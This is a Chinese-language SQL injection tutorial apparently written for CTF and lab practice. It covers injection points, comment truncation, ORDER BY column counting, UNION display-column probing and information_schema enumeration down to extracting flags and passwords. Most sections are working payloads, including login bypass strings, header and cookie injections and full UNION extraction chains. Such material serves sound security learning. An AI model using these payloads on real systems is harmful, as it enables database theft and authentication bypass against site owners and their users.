## [g-basic] 原理与分类——注入的本质是用户输入被拼进 SQL 执行，改变语句语义
### [basic-what] SQL 注入原理 | easy | 原理;拼接;危害 | -
> 用户可控数据未经过滤或参数化，直接拼接进 SQL 语句，改变原语句语义，造成数据泄露、认证绕过甚至 RCE。

#### 这个条目的作用
把"SQL 注入到底是什么"讲透：它不是一个神秘的技巧，而是程序把用户的输入**当成 SQL 代码的一部分**去执行。看懂这一条，后面所有注入手法（联合、报错、盲注）都是同一个原理的不同玩法。

#### 前置条件
- 一个存在注入点的靶场页面（本地 DVWA/Sqli-labs，或 CTF 题目给的 URL）。
- 知道页面大致在做什么：登录页、新闻详情页、搜索页都行。
- 浏览器地址栏能直接改参数（GET 请求即可，不用抓包工具）。

#### 第 1 步：找到"用户输入进 SQL"的位置（操作：观察 URL / 表单）
先看 URL。形如 `http://target/news.php?id=1` 的，`id=1` 就是最典型的注入点——后端十有八九执行了类似：

```php
$sql = "SELECT * FROM news WHERE id = " . $_GET['id'];
```

**预期结果**：能说出"哪个参数进了 SQL"。找不到就看看有没有登录框、搜索框，那些也是候选。

#### 第 2 步：输入一个单引号，验证"输入真的进了 SQL"（操作：浏览器地址栏）
把 URL 改成：

```txt
http://target/news.php?id=1'
```

**预期结果**：页面报错（`You have an error in your SQL syntax` 之类）或页面内容异常、返回 500。
**如果不行**：页面毫无变化，说明要么参数没进 SQL（比如被转义/参数化了），要么报错被吞了——别急，继续第 3 步用"真/假条件"判断。

#### 第 3 步：构造恒真条件，看返回是否异常（操作：地址栏）
对比下面两个 URL：

```txt
http://target/news.php?id=1 AND 1=1
http://target/news.php?id=1 AND 1=2
```

**预期结果**：`AND 1=1` 正常显示新闻，`AND 1=2` 什么都不显示（或报错）。页面出现差异 = 注入点确认。
**如果不行**：两个结果一样，说明参数没被拼进 SQL（比如用了参数化查询），这个点打不了，换别的参数试。

#### 第 4 步：用 OR 绕过登录（操作：登录框或 URL 参数）
如果目标有登录功能，用户名框输入：

```txt
' OR '1'='1
```

密码随便填。后端若拼 SQL，实际执行变成：

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'xxx';
```

**预期结果**：`OR '1'='1'` 恒真，查询返回所有用户，第一条往往是 admin，直接登录成功。
**如果不行**：登录失败。可能密码也拼在同一句里且你的 OR 没包住密码条件，试试用户名填 `admin' -- `（注释掉后面）或 `' OR 1=1 -- `。

#### 第 5 步：把"执行过程"在脑子里还原一遍（理解，无操作）
程序拼 SQL 时没有任何"这是代码还是数据"的区分：

```sql
-- 程序员本意：查 id=1 的新闻
SELECT * FROM news WHERE id = 1
-- 注入后：id 位置变成了一段完整 SQL 片段
SELECT * FROM news WHERE id = 1 AND 1=1
```

输入里的 `AND 1=1` 被**当成 SQL 代码执行**了——这就是注入的本质：输入越过了"数据"的边界，变成了"代码"。

#### 第 6 步：盘点危害面（操作：对照表格自查）
| 危害 | 说明 | 典型表现 |
| --- | --- | --- |
| 数据泄露 | 拖库：库名、表名、字段、全部数据 | 能查出任意表的内容 |
| 认证绕过 | `OR 1=1`、万能密码、注释掉密码判断 | 不输密码直接登录 |
| 数据篡改 | UPDATE/DELETE（堆叠注入） | 改别人密码、删数据 |
| RCE | 写文件、UDF、日志写马（MySQL） | 拿到服务器 shell |

**预期结果**：能对任意注入点说出"最多能造成什么危害"。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 输入 `'` 页面毫无反应 | 参数没进 SQL（参数化/转义） | 换参数、换注入类型（数字型可能不用引号） |
| 单引号报错但 `AND 1=1` 无差异 | 字符型注入，引号闭合方式不对 | 补引号：`1' AND 1=1 --+` 再看差异 |
| 登录框 `' OR '1'='1` 无效 | 密码条件没被包进 OR | 改用 `' OR 1=1 -- ` 注释掉密码判断 |
| 报错信息被吞（显示 500/空白） | 程序关了报错显示 | 改用布尔差异或时间盲注判断 |

#### 实战要点
- 注入点判定金标准：**真/假两个条件产生可观察差异**，比单引号报错更可靠。
- 先看参数类型：数字型（`id=1`）不用引号，字符型（`name='x'`）要闭合引号。
- 审计代码时只盯一处：**字符串拼接 SQL 的地方**（`"SELECT ... " . $var`），参数化查询的地方没戏。
- 危害优先级从低到高：泄露 < 绕过 < 篡改 < RCE，先确认能读数据再考虑提权。
- 遇到 WAF/过滤别硬刚，先确认注入存在，绕过是后面章节的事。

### [basic-comment] 注释符与语句截断 | easy | 注释;--;#;语句截断 | -
> 注入后需要"吞掉"原语句剩余的引号与 SQL，用注释符截断是基础操作。

#### 这个条目的作用
注入 payload 之后，原 SQL 语句的尾巴（多余的引号、`AND ...` 条件）还挂在后面，不处理就会语法错误。注释符的作用就是把"剩下的部分全部变成注释"，让注入的片段成为完整合法的 SQL。**不会注释，联合注入一步都走不动。**

#### 前置条件
- 已确认一个字符型注入点（输入 `'` 会报错）。
- 理解字符型语句形态：`SELECT * FROM users WHERE name = '输入'`。
- 记住目标以 MySQL 为主（CTF 里 90% 以上是 MySQL）。

#### 第 1 步：理解为什么要截断（概念）
假设原语句：

```sql
SELECT * FROM users WHERE username = 'admin'
```

注入 `' OR '1'='1` 后变成：

```sql
SELECT * FROM users WHERE username = '' OR '1'='1'
```

如果后面还有内容（比如 `' AND password='xxx'`），多余部分会破坏语法：

```sql
-- 密码框注入，尾部有多余条件
SELECT * FROM users WHERE username = '' OR '1'='1' AND password='123'
-- 这还能用，但更常见的是报错场景：
SELECT * FROM users WHERE id = 1' AND status=1   -- 语法错误！
```

解决办法：注入后把尾巴**注释掉**。

#### 第 2 步：MySQL 的 `-- ` 注释（操作：地址栏，注意空格）
```txt
?id=1' -- 
```

**关键点**：MySQL 里 `--` 后面**必须跟一个空格或控制字符**才是注释，直接写 `--` 不生效！

**预期结果**：URL 里空格会变成 `%20`，浏览器通常自动处理。手动构造时最稳的是 `--+`：URL 中 `+` 解码为空格，等价于 `-- `。所以 CTF 里满屏的：

```sql
?id=1' AND 1=1 --+
?id=1' AND 1=1 --%20
?id=1' AND 1=1 --%09
```

**如果不行**：报错还在，八成是 `--` 后面没空格。数一下：`--+` 的 `+` 必须在 URL 里（浏览器地址栏）才会被解码成空格；如果 payload 在表单里提交，`+` 不会变空格，改用 `#` 或 `--%20`。

#### 第 3 步：用 `#` 注释（操作：地址栏）
```txt
?id=1' AND 1=1 #
```

**预期结果**：`#` 之后全部是注释，**不需要空格**，比 `-- ` 省心。
**注意**：`#` 在 URL 里是"锚点"符号，浏览器会把它后面的内容截掉不发送！所以在**地址栏**里要把 `#` 编码成 `%23`：

```txt
?id=1' AND 1=1 %23
```

在 **Burp Repeater / 抓包工具**里直接发 `#` 没问题（不会截断），这是两者最大的差别。

#### 第 4 步：块注释 `/* */`（操作：地址栏）
```txt
?id=1' AND 1=1 /*尾巴全部被吞*/
```

**预期结果**：`/*` 到 `*/` 之间全部是注释，适合"不想猜原语句剩多少"的场景。更多时候 `/**/` 被用来**替代空格**（绕过空格过滤，见绕过章节）。

#### 第 5 步：其他数据库的注释符（对照表）
| 数据库 | 注释符 | 注意 |
| --- | --- | --- |
| MySQL | `-- `（需空格）、`#`、`/* */` | `--+` 中 `+` 解码为空格 |
| PostgreSQL | `--`、`/* */` | `--` 后到行尾 |
| MSSQL | `--`、`/* */` | 另有 `;` 结束语句 |
| Oracle | `--`、`/* */` | **没有 `#`** |
| SQLite | `--`、`/* */` | 与 PG 类似 |

**预期结果**：看到报错里带 `PostgreSQL`/`Microsoft`/`ORA-` 等字样就知道换注释符了。

#### 第 6 步：完整验证一次（操作：把三步串起来）
```txt
?id=1' AND 1=1 --+     → 正常显示（真条件生效）
?id=1' AND 1=2 --+     → 无结果（假条件生效）
?id=1' AND 1=1 %23     → 正常显示（# 注释同样生效）
```

**预期结果**：三条结果符合注释，说明"注入 + 注释截断"链路全通，可以进入联合注入章节。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| `--` 后面没空格，注入无效 | MySQL 严格要求 `-- ` 后跟空白 | 用 `--+`、`--%20` 或改 `#` |
| 地址栏里 `#` 后面的 payload 丢了 | 浏览器把 `#` 当锚点 | 编码成 `%23`，或改用 Burp 发 |
| 表单提交时 `--+` 不生效 | 表单里 `+` 不是空格 | 用 `#`（表单里不截断）或 `--%20` |
| 报错显示 `PostgreSQL`/`ORA-` | 目标不是 MySQL | 换对应注释符（PG/Oracle 无 `#`） |

#### 实战要点
- 默认组合：**地址栏用 `--+`，Burp 里用 `#`**，两个都失效再试 `--%20`。
- `#` 只在 MySQL 有；识别到其他库立刻换 `--`。
- 注释不只用于截断：`/**/` 还能当空格用（绕过空格过滤），`/*!50000...*/` 是版本注释（MySQL 才执行）。
- 报错信息是你的免费情报：注释符写错时看报错原文能反推出原语句结构。

### [basic-position] 注入位置与数据流 | easy | GET;POST;Header;Cookie;搜索型 | -
> 注入不只发生在 GET 参数：POST 表单、请求头、Cookie 乃至搜索框都可能成为注入点。

#### 这个条目的作用
新手习惯只盯 URL 里的 `?id=1`，但实战里注入点遍布整个 HTTP 请求：表单、请求头、Cookie、JSON body。本条目教你在任何位置都能"发现 + 验证"注入点，并快速判断注入类型（数字型/字符型/搜索型），为选对 payload 打基础。

#### 前置条件
- 已掌握 basic-what 的真假条件判定法。
- 会开 Burp Suite，能用 Repeater 改请求（改 POST 数据、请求头需要它）。
- 一个多功能的靶场（比如有登录、搜索、个人资料页的站）。

#### 第 1 步：GET 参数——最直接的注入点（操作：地址栏）
```txt
http://target/news.php?id=1
http://target/news.php?id=1 AND 1=1    → 正常
http://target/news.php?id=1 AND 1=2    → 异常
```

**预期结果**：真/假有差异 = GET 参数注入成立。
**如果不行**：换其他参数试（`?page=1`、`?cat=1`、`?id=2`……每个都测一遍）。

#### 第 2 步：POST 参数——表单和 JSON（操作：Burp Repeater）
登录框、查询框的数据走 POST body，地址栏改不了。Burp 抓包后 Send to Repeater，改 body：

```http
POST /login.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

user=admin'&pass=123456
```

后端若执行 `SELECT * FROM users WHERE username='admin'' AND ...` 就会报错。
JSON 接口同理：

```http
POST /api/search HTTP/1.1
Content-Type: application/json

{"keyword": "a' OR '1'='1"}
```

**预期结果**：改 `'` 后返回 500/报错/异常 JSON，说明 POST 参数进了 SQL。
**如果不行**：无任何异常，可能后端做了转义或参数化；试试 `"a" AND 1=1` 这类无引号闭合判断。

#### 第 3 步：请求头——User-Agent、X-Forwarded-For（操作：Burp Repeater）
有些程序把 User-Agent、Referer、X-Forwarded-For 写进数据库（访问日志、统计表）。在 Repeater 里改：

```http
GET /stats.php HTTP/1.1
Host: target
User-Agent: ' OR '1'='1
X-Forwarded-For: 1.1.1.1' AND 1=1
```

**预期结果**：页面/返回数据出现异常，说明请求头被拼进了 SQL。
**深入**：这类值常被**存库后再取出拼接**（二次注入）——第一次写入时安全，第二次在别的功能里被拼进 SQL 才触发。

#### 第 4 步：Cookie——别忽略它（操作：Burp Repeater）
```http
GET /profile.php HTTP/1.1
Host: target
Cookie: user=1' AND 1=1; session=abc123
```

**预期结果**：Cookie 参数同样可以成为注入点。后端若用 `SELECT ... WHERE uid = '$_COOKIE['user']'` 就中招。
**注意**：改 Cookie 可能影响登录态，测试前先记下原始值，测完恢复。

#### 第 5 步：搜索型注入——LIKE 语句的闭合（操作：地址栏/搜索框）
搜索功能执行的是：

```sql
SELECT * FROM news WHERE title LIKE '%关键词%'
```

注意：关键词前后**各有一个 `%` 和引号**，闭合方式不一样：

```txt
%' AND 1=1 --+        → 注释掉后面的 '% ，语句闭合成功
%' AND 1=2 --+        → 假条件，无结果
```

**预期结果**：第一条返回全部，第二条返回空 = 搜索型注入成立。
**如果不行**：先搜普通词确认搜索框本身工作正常，再上 payload。

#### 第 6 步：判定注入类型，决定 payload 形态（操作：对照下表）
| 类型 | 语句形态 | 测试 payload | 后续打法 |
| --- | --- | --- | --- |
| 数字型 | `WHERE id = 1` | `1 AND 1=1` / `1 AND 1=2` | 不用引号，`1 UNION SELECT ...` |
| 字符型 | `WHERE name = 'x'` | `x' AND '1'='1` | 要闭合引号：`' UNION SELECT ... --+` |
| 搜索型 | `WHERE title LIKE '%x%'` | `%' AND 1=1 --+` | 闭合 `%'`：`%' UNION SELECT ... --+` |

**判定方法**：先输入 `1 AND 1=1`——如果正常，说明可能数字型；再加引号测字符型；搜索框用 `%'` 开头测搜索型。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 只测了 GET 参数，POST 接口漏了 | 攻击面不完整 | 登录/搜索/上传等所有表单都抓包测一遍 |
| 改 POST body 后页面没反应 | body 里 payload 被转义 | 先确认参数确实传到后端，再试引号闭合 |
| 搜索框 `' OR 1=1` 无效 | 没闭合前导的 `%'` | 用 `%' AND 1=1 --+` 开头 |
| 改了 Cookie 直接掉登录 | 动了会话相关值 | 先测 `user` 这类业务字段，别动 session |

#### 实战要点
- 攻击面清单：**GET 参数 → POST 参数 → Cookie → 请求头**，按顺序过一遍，一个都别漏。
- 搜索框和"排序/筛选"参数是最容易被忽略的注入点，也是 CTF 高频考点。
- 请求头注入常有二次注入风险：写入时看不出问题，找"展示/统计这些数据"的页面再触发。
- 判断类型的核心：构造**真/假两个条件看布尔差**，比看报错更稳（报错可能被吞）。
- 所有位置验证流程一致：报错 → 真假差异 → 确定类型 → 选 payload。

## [g-union] 联合注入——有回显时的最高效打法，一条 SQL 直接查出任意数据
### [union-orderby] order by 探测列数 | easy | order by;列数;二分 | -
> UNION 要求前后两个 SELECT 列数一致，先用 ORDER BY 做二分探测出真实列数。

#### 这个条目的作用
UNION 注入的铁律：**前后两条 SELECT 的列数必须相同**，差一列就报错。所以打 UNION 的第一步永远是"数清楚原查询有几列"。ORDER BY 就是干这个的：让数据库按第 n 列排序，n 超了就报错，用报错当"边界探测器"。

#### 前置条件
- 已确认注入点且**有回显**（页面会显示查询结果内容，比如新闻标题）。
- 会用注释符截断（`--+` 或 `%23`）。
- 知道注入类型：数字型直接接，字符型先闭合引号。

#### 第 1 步：确认注入点形态（操作：地址栏）
数字型：

```txt
?id=1
?id=1 AND 1=1   → 正常
?id=1 AND 1=2   → 异常
```

字符型：

```txt
?id=1'
?id=1' AND 1=1 --+   → 正常
?id=1' AND 1=2 --+   → 异常
```

**预期结果**：确认类型后，后面所有 ORDER BY 都套用同一种写法（数字型不加引号，字符型 `1'` 开头）。

#### 第 2 步：从小往大试（操作：地址栏，最笨但最直观）
```txt
?id=1 ORDER BY 1 --+   → 正常
?id=1 ORDER BY 2 --+   → 正常
?id=1 ORDER BY 3 --+   → 正常
?id=1 ORDER BY 4 --+   → 报错！列数 = 3
```

**预期结果**：第 n 个开始报错，则列数 = n-1。列数少（≤5）时这个办法最快。
**如果不行**：`ORDER BY 1` 就报错？可能是注入类型判断错了（字符型没闭合引号），或注释没生效。

#### 第 3 步：二分法加速（操作：地址栏，列数多时用）
从一个大数开始折半：

```txt
?id=1 ORDER BY 10 --+   → 不报错
?id=1 ORDER BY 20 --+   → 报错 → 列数在 10~19
?id=1 ORDER BY 15 --+   → 不报错 → 列数在 15~19
?id=1 ORDER BY 18 --+   → 报错 → 列数在 15~17
?id=1 ORDER BY 16 --+   → 不报错 → 列数在 16~17
?id=1 ORDER BY 17 --+   → 不报错 → 列数 = 17
```

**预期结果**：每次折半，几十列的场景 5~6 次请求搞定。
**原理**：`ORDER BY n` 是按第 n 列排序，n 超过实际列数时数据库报 `Unknown column '17' in 'order clause'` 这类错。

#### 第 4 步：验证列数（操作：地址栏）
确定疑似列数 N 后，做两个确认：

```txt
?id=1 ORDER BY N --+      → 正常（N 在范围内）
?id=1 ORDER BY N+1 --+    → 报错（超出）
```

**预期结果**：N 正常、N+1 报错，列数锁定为 N。
**如果不行**：N+1 也正常？说明有 WAF 或数据库对 ORDER BY 做了别的处理，回头检查 URL 编码（空格用 `%20` 试试）。

#### 第 5 步：把列数记下来，准备 UNION（操作：记录）
列数拿到手，下一步（union-select 条目）的占位符数量就确定了：

```txt
列数 = 3  →  UNION SELECT 1,2,3
列数 = 5  →  UNION SELECT 1,2,3,4,5
```

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| `ORDER BY 1` 就报错 | 注入类型判断错 / 引号没闭合 | 字符型用 `1' ORDER BY 1 --+` |
| 一直不报错 | 注释没生效（`--` 后没空格） | 换 `--+`、`--%20` 或 `%23` |
| 报错但页面无变化 | 报错被程序吞掉 | 用布尔差异：ORDER BY 后看页面是否变化 |
| 空格被过滤 | WAF 拦空格 | `ORDER/**/BY` 或 `%09` 替代（见绕过章节） |

#### 实战要点
- ORDER BY **只用数字**，别写列名（列名可能大小写/引号问题一堆）。
- ORDER BY 只用来探测，**真正取数据是下一步 UNION SELECT 的事**，别混。
- 列数 ≤ 5 直接递增试；列数多立刻切二分，别傻傻试到 50。
- 数字型不用引号：`1 ORDER BY 3`；字符型必须闭合：`1' ORDER BY 3 --+`。
- 拿到列数马上验一次 N 和 N+1，别拿错误列数去构造 UNION（会白折腾一轮）。

### [union-select] union select 找回显位 | easy | union;回显位;select | -
> 知道列数后，用 UNION SELECT 占位列探测页面上回显了哪一列的数据。

#### 这个条目的作用
列数知道了，但页面**只显示查询结果的某几列**（比如只打印标题、不打印时间）。直接查数据会"查得到但看不见"。回显位探测就是：用 `UNION SELECT 1,2,3...` 的占位数字，看页面上**哪个数字被打印出来**，那个位置就是能回显的列，之后把数字替换成任意查询表达式即可。

#### 前置条件
- 已完成 order by 探测，**列数已知**（本条目假设列数 = 5，按实际替换）。
- 注入点有回显。
- 会注释截断。

#### 第 1 步：构造占位 UNION（操作：地址栏）
假设列数 5，数字型：

```txt
?id=1 UNION SELECT 1,2,3,4,5 --+
```

字符型：

```txt
?id=1' UNION SELECT 1,2,3,4,5 --+
```

**预期结果**：页面上出现数字（比如显示了 `2` 和 `4`），说明这两列是回显位。
**如果不行**：页面没变化——看第 2 步，多半是"第一条查询有结果，UNION 第二条被忽略了"。

#### 第 2 步：让原查询返回空（操作：地址栏，关键一步）
把 id 改成不存在的值：

```txt
?id=-1' UNION SELECT 1,2,3,4,5 --+
?id=0' UNION SELECT 1,2,3,4,5 --+
?id=99999' UNION SELECT 1,2,3,4,5 --+
```

**预期结果**：`id=-1`（或 0/不存在的 id）让第一条 SELECT 查不到任何行，页面上**只剩下 UNION 第二条的结果**，数字立刻显示出来。
**原理**：`UNION` 默认去重且只显示结果集，第一条为空时第二条就是全部内容。
**如果不行**：还是没数字 → 检查列数对不对（回 union-orderby 重测），或注释没生效。

#### 第 3 步：确认回显位并做初步探测（操作：地址栏）
在显示出来的数字位置上放查询函数：

```txt
?id=-1' UNION SELECT 1,database(),user(),version(),5 --+
```

**预期结果**：第 2 列位置显示库名（如 `ctf`），第 3 列显示用户和 MySQL 版本。**能回显库名 = 回显位确认，注入打通。**
**如果不行**：数字有显示但替换成函数后空白/报错——可能该列类型约束（见第 4 步），换一个回显位试。

#### 第 4 步：占位符类型问题排查（操作：对比三种写法）
| 写法 | 说明 |
| --- | --- |
| `UNION SELECT 1,2,3` | 直观，但目标列如果是字符串类型，可能类型不匹配报错 |
| `UNION SELECT NULL,NULL,NULL` | 兼容所有类型，最稳，列数多时推荐 |
| `UNION SELECT 1,database(),3,...` | 直接放表达式代替数字，一步到位 |

```txt
?id=-1' UNION SELECT NULL,NULL,NULL,NULL,NULL --+
```

**预期结果**：NULL 版不报错，再逐个替换 NULL 为查询函数找回显位。
**如果不行**：NULL 都报错 → 列数算错了，回头重测 ORDER BY。

#### 第 5 步：测试任意查询表达式（操作：地址栏）
回显位确认后，可以放任何子查询：

```txt
?id=-1' UNION SELECT 1,(SELECT password FROM users LIMIT 0,1),3,4,5 --+
```

**预期结果**：回显位显示 users 表第一行的 password。能查任意数据 = 联合注入完全打通。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| UNION 后页面没变化 | 第一条查询有结果，被 UNION 显示 | `id=-1` / `id=0` 让原查询为空 |
| 数字显示了，替换函数后空白 | 该列类型不匹配或回显位选错 | 换 NULL 占位，或换其他回显位 |
| 报错 `The used SELECT statements have a different number of columns` | 列数不对 | 回 union-orderby 重测列数 |
| 回显位只有一列 | 页面只打印一个字段 | 把查询放这唯一一列，配合 GROUP_CONCAT 压缩结果 |

#### 实战要点
- 顺序不能乱：**先 ORDER BY 数列数，再 UNION SELECT 占位，再替换表达式**。
- 回显位探测用数字（`1,2,3`）比 NULL 直观，正式查询再切 NULL 防类型报错。
- 页面上出现的数字可能有多个，**优先用第一个**（显示位置更靠前、更稳定）。
- 找不到任何回显位？说明该页面无回显，换布尔/时间盲注（见盲注章节）。
- `database()` 能回显基本就赢了：后面查表查列查 flag 全是套路化操作。

### [union-infoschema] information_schema 查库表列 | medium | information_schema;查库;查表;查列;flag | -
> information_schema 是 MySQL 的元数据库，存着所有库、表、列的名字，查 flag 的标准全流程如下。

#### 这个条目的作用
联合注入的最终目的：**把 flag 从数据库里挖出来**。但 flag 在哪个库、哪张表、哪一列，你一概不知。information_schema 就是 MySQL 自带的"数据库的数据库"——所有库名、表名、列名都记在里面。本条目带你走完**注入点 → 库名 → 表名 → 列名 → 数据**的完整五步链，这是 CTF 里出现频率最高的固定套路。

#### 前置条件
- 已完成 union-orderby（列数已知，本条目假设列数 = 5，按实际改）和 union-select（回显位已知，假设第 2 列回显）。
- 目标为 MySQL（报错里带 MySQL 字样，或用 `VERSION()` 确认过）。
- 会用 `--+` / `%23` 注释。

#### 第 1 步：查当前库名（操作：地址栏）
先看自己正连的是哪个库：

```txt
?id=-1' UNION SELECT 1,database(),3,4,5 --+
```

**预期结果**：第 2 列显示库名，比如 `ctf` 或 `web1`。记下这个库名，后面查表要用。
**如果不行**：第 2 列空白 → 回显位不是第 2 列，逐个位置放 `database()` 试（`1,database(),3,4,5` → `1,2,database(),4,5`……）。

#### 第 2 步：列出所有库（操作：地址栏，确认攻击面）
```txt
?id=-1' UNION SELECT 1,GROUP_CONCAT(schema_name),3,4,5 FROM information_schema.schemata --+
```

**预期结果**：第 2 列显示一串库名（如 `information_schema,ctf,mysql,...`）。**信息量最大的一步**：可能发现隐藏库。
**看不懂**：`information_schema.schemata` 是"所有库的清单"，`schema_name` 是库名这一列，`GROUP_CONCAT` 把所有行拼成一行（否则只能显示第一条）。库名用**单引号**包住是字符串常量。

#### 第 3 步：查指定库的所有表（操作：地址栏，替换库名）
```txt
?id=-1' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5 FROM information_schema.tables WHERE table_schema='ctf' --+
```

**预期结果**：显示 `ctf` 库的所有表名，比如 `users,flag,news`。**flag 表往往一眼可见**（叫 flag、flag_table、secret 之类）。
**如果不行**：空结果 → 库名拼错了（大小写敏感！MySQL 在 Linux 下表/库名区分大小写），回第 1 步核对库名。
**注意**：这里 `WHERE table_schema='ctf'` 也可换成 `WHERE table_schema=database()` 偷懒（当前库），但多库场景显式写库名更稳。

#### 第 4 步：查指定表的所有列（操作：地址栏，替换表名）
```txt
?id=-1' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5 FROM information_schema.columns WHERE table_name='flag' --+
```

**预期结果**：显示 `flag` 表的列名，比如 `id,flag` 或 `flag` 一列。记下列名。
**注意**：这里只用了 `table_name='flag'` 没限定库——如果多个库都有同名表会串数据，保险写法：

```txt
... FROM information_schema.columns WHERE table_schema='ctf' AND table_name='flag' --+
```

#### 第 5 步：取数据（操作：地址栏，决战一步）
```txt
?id=-1' UNION SELECT 1,flag,3,4,5 FROM ctf.flag --+
```

或者（列名就是 `flag`）：

```txt
?id=-1' UNION SELECT 1,(SELECT flag FROM ctf.flag),3,4,5 --+
```

**预期结果**：页面上直接显示 `flag{...}` 或 `ctf{...}` 格式的字符串——**拿 flag，收工**。
**如果不行**：报错 `Unknown column 'flag'` → 列名不对，回第 4 步核对；报错 `doesn't exist` → 库名/表名不对。**注意**：`ctf.flag` 是"库名.表名"写法，列名 `flag` 若是保留字或需要转义，用反引号：`` `flag` ``。

#### 第 6 步：数据太长/多行时的处理（操作：对比三种写法）
| 场景 | 写法 | 说明 |
| --- | --- | --- |
| 多行数据只显示一行 | `GROUP_CONCAT(column_name)` | 把多行拼成一行逗号分隔 |
| 想看特定一行 | `... LIMIT 0,1` / `LIMIT 1,1` | 逐条取出 |
| 字符串太长显示不全 | `SUBSTR(flag,1,30)` | 分段截取 |

```txt
?id=-1' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5 FROM information_schema.columns WHERE table_name='flag' --+
?id=-1' UNION SELECT 1,(SELECT column_name FROM information_schema.columns WHERE table_name='flag' LIMIT 0,1),3,4,5 --+
?id=-1' UNION SELECT 1,SUBSTR(flag,1,30),3,4,5 FROM ctf.flag --+
```

**预期结果**：多行→拼一行、指定行→逐条出、超长→分段出，三种情况都有招。

#### 完整流程速查（把五步串起来）
```sql
-- 1. 当前库
UNION SELECT 1,database(),3,4,5 --+
-- 2. 所有库
UNION SELECT 1,GROUP_CONCAT(schema_name),3,4,5 FROM information_schema.schemata --+
-- 3. 指定库的所有表
UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5 FROM information_schema.tables WHERE table_schema='ctf' --+
-- 4. 指定表的所有列
UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5 FROM information_schema.columns WHERE table_schema='ctf' AND table_name='flag' --+
-- 5. 取数据
UNION SELECT 1,flag,3,4,5 FROM ctf.flag --+
```

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 查表结果为空 | 库名拼错 / 大小写不匹配 | 回第 1 步核对 `database()` 输出，原样复制 |
| 多库同名表串数据 | 只写了 `table_name` 没限定库 | 补 `AND table_schema='库名'` |
| `Unknown column` 报错 | 列名不对 | 回第 4 步看 GROUP_CONCAT 的准确输出 |
| 数据只显示一行 | 没拼 GROUP_CONCAT | 加 `GROUP_CONCAT(...)` 压成一行 |
| 查询串太长被截断/URL 超限 | 结果超长 | `SUBSTR` 分段 + 多请求 |
| 第 2 列一直空白 | 回显位不在第 2 列 | 把表达式逐个放到每个数字位置试 |

#### 实战要点
- 五步链必须**按顺序走**：库 → 表 → 列 → 数据，跳步必然报错，缺哪步信息回上一步取。
- `GROUP_CONCAT` 是联合注入的命根子：没有它，多行结果永远只显示第一条。
- 找表名时**优先扫一眼有没有 flag 相关的名字**（flag、flaggg、secrets、keys），CTF 出题人命名一般有迹可循。
- 库名/表名/列名全部**大小写敏感**，从查询结果里复制粘贴，别手打。
- 表名列名是保留字（如 `order`、`select`）时用反引号包裹：`` `order` ``。
- 非 MySQL（PG/SQLite/MSSQL）元数据表不同，见数据库差异对照章节；SQLite 用 `sqlite_master`。
- 没有回显位时这套全废，改走布尔/时间盲注，但**查询内容一模一样**（information_schema 照用），只是换读取通道。
